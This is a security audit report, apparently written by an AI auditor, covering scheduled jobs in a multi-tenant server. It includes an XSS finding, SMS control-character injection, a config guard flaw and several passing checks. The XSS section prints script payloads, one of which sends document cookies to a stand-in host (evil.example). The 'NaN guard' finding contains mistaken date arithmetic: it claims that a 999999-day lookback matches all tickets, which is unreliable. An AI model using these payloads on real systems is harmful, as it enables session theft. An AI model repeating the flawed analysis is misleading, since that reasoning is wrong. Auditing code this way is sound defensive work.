# S31 — Cron / Background Jobs / Scheduled Services

Auditor: Claude (Sonnet 4.6)
Scope: `packages/server/src/services/dunningScheduler.ts`, `recurringInvoicesCron.ts`, `slaBreachCron.ts`, `slaAssignment.ts`, `retentionSweeper.ts`, `dataExportScheduleCron.ts`, `giftCardExpirySweep.ts`, `receiptOcrCron.ts`, `reportEmailer.ts`, `scheduledReports.ts`, `customerHealthScore.ts`, `usageTracker.ts`, `middleware/localhostOnly.ts`, and related inline crons in `index.ts`.

---

### MEDIUM Stored XSS via unescaped schedule.name in data-export delivery email HTML

**Where:** `packages/server/src/services/dataExportScheduleCron.ts:231–233`

**What:**
When a scheduled data export completes, the cron sends a delivery email whose HTML body directly interpolates `schedule.name` without `escapeHtml()`. An admin who creates a schedule with a crafted name such as `<img src=x onerror=alert(document.cookie)>` will have that payload execute in the delivery recipient's email client when the export fires.

**Code:**
```typescript
await sendEmail(db, {
  to: schedule.delivery_email,
  subject: `Data export ready — ${schedule.name}`,
  html: [
    `<p>Your scheduled data export "<strong>${schedule.name}</strong>" has completed.</p>`,
    `<ul>`,
    `<li>Export type: ${exportType}</li>`,
    `<li>Rows exported: ${rowCount.toLocaleString()}</li>`,
    `<li>File: ${fileName}</li>`,
    `</ul>`,
  ].join(''),
});
```

**Exploit:**
An admin (or an attacker who has compromised an admin account) creates a data-export schedule with name `<script>fetch('https://evil.example/'+document.cookie)</script>`. When the hourly cron fires and the export succeeds, the email client of every address in `delivery_email` executes the payload — enabling session theft or credential harvesting. The `delivery_email` is also admin-controlled, so a compromised admin could self-direct the attack toward another admin's inbox.

**Fix:**
Import `escapeHtml` from `../utils/escape.js` and wrap all template variables in the `html` array with it: `escapeHtml(schedule.name)`, `escapeHtml(exportType)`. The filename is already nonce-based and safe, but should also be escaped for defence-in-depth.

---

### LOW SMS content injection — inline follow-up crons omit stripSmsControlChars

**Where:** `packages/server/src/index.ts:2875`, `:3181`, `:3268`, `:3341`

**What:**
Four inline cron blocks (appointment reminders, stale-ticket follow-ups, invoice reminders, estimate follow-ups) interpolate customer-controlled strings directly into SMS body strings without calling `stripSmsControlChars`. The `dunningScheduler.ts` service (the only cron that was extracted to its own module) correctly calls `renderTemplate(…, vars, 'sms')` which strips Unicode control characters, right-to-left marks, and other characters that can truncate or spoof SMS segments. The inline crons share the same risk but were never given the same treatment.

**Code:**
```typescript
// index.ts:2875 (appointment reminder)
const body = `Hi ${appt.first_name || 'there'}, reminder: you have an appointment at ${storeName} — ${appt.title}. See you soon!`;

// index.ts:3181 (stale ticket)
const body = `Hi ${ticket.customer_name || 'there'}, your repair (${ticket.order_id}) is still in progress at ${storeName}. We'll update you soon.`;

// index.ts:3268 (invoice reminder — custom template path)
const body = customTemplate
  ? customTemplate
      .replace(/\{name\}/g, inv.customer_name || 'there')
      // ... no stripSmsControlChars applied to substituted values
```

**Exploit:**
A customer whose first name is stored as `u202Bmalicious‫text` (Unicode bidirectional override) can cause SMS segments to display reordered or truncated text to their own phone number, creating a social-engineering vector where the operator's SMS appears to say something it does not. An appointment with a crafted `title` (no admin role required to create via `POST /api/v1/leads/appointments`, only `authMiddleware`) propagates unsanitized control characters through the nightly reminder batch.

**Fix:**
Import `stripSmsControlChars` from `../utils/escape.js` and apply it to every customer-sourced variable (`first_name`, `customer_name`, `order_id`, `appt.title`, `storeName`) before interpolation. Alternatively, extract the body construction into a shared helper that mirrors the `renderTemplate(…, vars, 'sms')` pattern already used in `dunningScheduler.ts`.

---

### LOW NaN guard bypass allows cron to run with no effective date filter

**Where:** `packages/server/src/index.ts:3129–3130`, `:3220–3221`, `:3302–3304`

**What:**
Three inline crons guard against zero/negative day values with `parseInt(cfgRow?.value || '0', 10) <= 0` but `parseInt` returns `NaN` for non-numeric config values (e.g., `stall_followup_days = 'disabled'`). `NaN <= 0` is `false` in JavaScript, so the guard passes and the cron proceeds. In better-sqlite3, binding `NaN` to a prepared statement converts it to `NULL`; SQLite then evaluates `'-' || NULL || ' days'` to `NULL`, making `updated_at < datetime('now', NULL)` always `UNKNOWN` — so no rows are returned and no SMS is sent. However, an operator who enters a very large number (e.g., `999999`) passes the guard and causes the WHERE clause to match every ticket created before the heat-death of the universe, sending SMS to up to `LIMIT 20` customers per tick regardless of actual staleness.

**Code:**
```typescript
const stallDays = parseInt(cfgRow?.value || '0', 10);
if (stallDays <= 0) return; // Feature disabled — NaN bypasses this check

// Later bound to: datetime('now', '-' || ? || ' days')
`).all(stallDays, stallDays, stallDays) as any[];
```

**Exploit:**
An admin sets `stall_followup_days` to `'xyz'` via `PUT /api/v1/settings/config`. `parseInt('xyz', 10)` returns `NaN`; `NaN <= 0` is false; the cron proceeds. In practice better-sqlite3 converts the NaN binding to NULL so no rows match and no SMS fires — but the code path is logically broken and a future change to the query structure could make it exploitable. More concretely, setting `stall_followup_days = 999999` causes the date predicate `updated_at < datetime('now', '-999999 days')` to match all tickets created in approximately the year 998973 CE or earlier — effectively matching ALL historical tickets on older SQLite builds that clamp date overflow.

**Fix:**
Replace the `parseInt(…) <= 0` guard with a positive finite check: `const n = Number.parseInt(cfgRow?.value, 10); if (!Number.isFinite(n) || n <= 0 || n > 365) return;`. Cap at a maximum of 365 days to prevent the large-number scenario. Apply the same pattern to `estimate_followup_days` and `invoice_reminder_days`.

---

### INFO localhostOnly middleware correctly resists X-Forwarded-For bypass

**Where:** `packages/server/src/middleware/localhostOnly.ts:26–32`

**What:**
`localhostOnly` uses `req.socket?.remoteAddress` (the raw TCP peer address) rather than Express's `req.ip`, which honours `X-Forwarded-For` when `trust proxy` is set. An attacker who passes `X-Forwarded-For: 127.0.0.1` cannot spoof the socket address. The loopback set includes all IPv4/IPv6 loopback forms including the Docker WSL2 variant.

**Code:**
```typescript
const rawIp = req.socket?.remoteAddress || '';
const ip = rawIp.toLowerCase();
const isLocal =
  LOCALHOST_IPS.has(ip) ||
  (ip.startsWith('::ffff:') && ip.slice('::ffff:'.length) === '127.0.0.1');
```

**Exploit:**
No bypass identified. This control is implemented correctly.

**Fix:**
No action required. For defence-in-depth, document that any future addition of a reverse proxy in front of the server must not change the binding of `/super-admin` or `/management/api` routes.

---

### INFO forEachDb / forEachDbAsync correctly filters terminated tenants

**Where:** `packages/server/src/index.ts:205`, `:255`

**What:**
Both cron iteration helpers query `tenants WHERE status = 'active'` before opening any tenant DB handle. Suspended, cancelled, and terminated tenants are never iterated. The cron services that accept an external `getDbsFn` callback (e.g., `startRecurringInvoicesCron`, `startSlaBreachCron`, `startDataExportScheduleCron`) all source their tenant list through `forEachDb`, so they inherit the same filter.

**Code:**
```typescript
const tenants = masterDb
  .prepare("SELECT slug FROM tenants WHERE status = 'active'")
  .all() as { slug: string }[];
```

**Exploit:**
No issue. Crons do not continue for terminated tenants.

**Fix:**
No action required. Confirm that the `tenantTermination.ts` service sets `status = 'terminated'` (or similar non-`'active'` value) before the LRU pool evicts the DB handle to avoid a brief window where a just-terminated tenant is still in the pool but a tick fires.

---

### INFO dunning POST /run-now correctly gated behind admin role + rate limiter

**Where:** `packages/server/src/routes/dunning.routes.ts:223–275`

**What:**
`POST /api/v1/dunning/run-now` checks `req.user?.role !== 'admin'` before calling `runDunningOnce`, and also enforces a 15-minute global cooldown via `consumeWindowRate`. The route is mounted behind `authMiddleware`. A non-admin authenticated user cannot trigger the dunning run. Rate limiting prevents double-click double-dispatch.

**Code:**
```typescript
router.post('/run-now', asyncHandler(async (req: Request, res: Response) => {
  if (req.user?.role !== 'admin') {
    throw new AppError('Admin only', 403);
  }
  const rateResult = consumeWindowRate(req.db, DUNNING_RUN_CATEGORY, 'global', 1, 15 * 60 * 1000);
  if (!rateResult.allowed) { /* 429 */ }
  // ...
  const summary = await runDunningOnce(db);
```

**Exploit:**
No bypass identified. Route is correctly guarded.

**Fix:**
No action required. Consider also adding an audit-log entry on the 429 path (currently only the 200 path is audited) so operators can detect repeated manual-trigger attempts.

---

### INFO Cron idempotency mechanisms are sound across all focus files

**Where:** Multiple files — see below.

**What:**
All focus-file crons use appropriate idempotency guards:
- `recurringInvoicesCron.ts`: atomic `UPDATE … WHERE next_run_at <= now()` inside a transaction; `changes === 0` skips duplicate.
- `dunningScheduler.ts`: `UNIQUE(invoice_id, sequence_id, step_index)` on `dunning_runs` prevents double-dispatch even if the cron fires twice.
- `slaBreachCron.ts`: `UPDATE … WHERE sla_breached = 0` (idempotent flip) + `INSERT OR IGNORE` on `sla_breach_log` for first-response entries.
- `dataExportScheduleCron.ts`: atomic claim `UPDATE … WHERE next_run_at <= now()` with `changes === 0` skip.
- `giftCardExpirySweep.ts`: `UPDATE … WHERE status = 'active' AND expires_at <= now()` is inherently idempotent.
- `retentionSweeper.ts`: `DELETE WHERE date < cutoff` is idempotent.
- `receiptOcrCron.ts`: status-machine (`pending → processing → done/failed`) with stale-cleanup pass prevents infinite retry.

**Exploit:**
No double-execution vulnerability found in any focus file.

**Fix:**
No action required.

---

### INFO No unguarded HTTP trigger for any cron task found

**Where:** All focus files + `index.ts` cron wiring.

**What:**
The only HTTP endpoint that manually triggers a cron task is `POST /api/v1/dunning/run-now`, which is behind `authMiddleware` and an admin-role check (verified above). All other cron services (`startRecurringInvoicesCron`, `startSlaBreachCron`, `startDataExportScheduleCron`, `startReceiptOcrCron`, `runReportEmailerTick`, retention sweep, gift-card expiry, health-score recompute, storage recalc) are triggered only by `setInterval` / `trackInterval` — no HTTP trigger, no internal endpoint. No cron is mounted on the public router without authentication.

**Exploit:**
No unauthenticated HTTP cron trigger found.

**Fix:**
No action required.
